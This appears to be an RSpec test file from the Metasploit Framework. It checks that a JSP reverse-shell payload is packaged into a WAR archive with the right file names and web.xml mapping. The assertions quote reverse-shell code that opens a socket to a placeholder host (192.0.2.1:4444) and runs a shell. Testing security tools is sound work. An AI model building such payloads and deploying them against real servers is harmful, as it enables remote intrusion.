require 'spec_helper'
require 'rex/zip'
require 'zip'

RSpec.describe Msf::Payload::JSP do
  include_context 'Msf::Simple::Framework#modules loading'

  subject(:payload) do
    load_and_create_module(
      module_type: 'payload',
      reference_name: 'java/jsp_shell_reverse_tcp',
      ancestor_reference_names: ['singles/java/jsp_shell_reverse_tcp']
    )
  end

  let(:encoded_payload) { Msf::EncodedPayload.new(framework, payload, {}) }

  before do
    payload.datastore['LHOST'] = '192.0.2.1'
    payload.datastore['LPORT'] = 4444
  end

  def unpack_war(war)
    entries = nil
    Zip::File.open_buffer(war.pack) do |archive|
      entries = archive.entries.reject(&:directory?).to_h { |entry| [entry.name, archive.read(entry.name)] }
    end
    entries
  end

  describe '#generate_war' do
    context 'without archive options' do
      let(:entries) { unpack_war(payload.generate_war) }
      let(:jsp_name) { entries.keys.find { |name| name.end_with?('.jsp') } }

      it 'retains the generated JSP name and welcome-file mapping' do
        expect(jsp_name).to match(/\A[a-z]{8,15}\.jsp\z/)
        expect(entries.fetch('WEB-INF/web.xml')).to include("<welcome-file>#{jsp_name}</welcome-file>")
      end

      it 'contains the real configured reverse-shell payload' do
        expect(entries.fetch(jsp_name)).to include('new Socket( "192.0.2.1", 4444 )', 'Runtime.getRuntime().exec( ShellPath )')
      end
    end

    it 'accepts an empty options hash through the public encoded-payload API' do
      entries = unpack_war(encoded_payload.encoded_war)
      expect(entries.keys.grep(/\.jsp\z/).length).to eq(1)
    end

    context 'with a caller-selected JSP basename' do
      let(:options) { { app_name: 'module_target_app', jsp_name: 'module_target_probe', arch: ARCH_JAVA }.freeze }
      let(:entries) { unpack_war(encoded_payload.encoded_war(options)) }

      it 'stores the JSP at the path the exploit will request' do
        expect(entries.keys).to contain_exactly('WEB-INF/web.xml', 'module_target_probe.jsp')
      end

      it 'uses the same name in the welcome-file mapping' do
        expect(entries.fetch('WEB-INF/web.xml')).to include('<welcome-file>module_target_probe.jsp</welcome-file>')
      end

      it 'preserves the generated payload bytes' do
        generated_source = nil
        allow(payload).to receive(:generate).and_wrap_original do |original, *arguments|
          generated_source = original.call(*arguments)
        end

        expect(entries.fetch('module_target_probe.jsp')).to eq(generated_source)
      end
    end

    it 'generates a default name when the requested basename is nil' do
      entries = unpack_war(encoded_payload.encoded_war(jsp_name: nil))
      expect(entries.keys.grep(/\A[a-z]{8,15}\.jsp\z/).length).to eq(1)
    end
  end
end
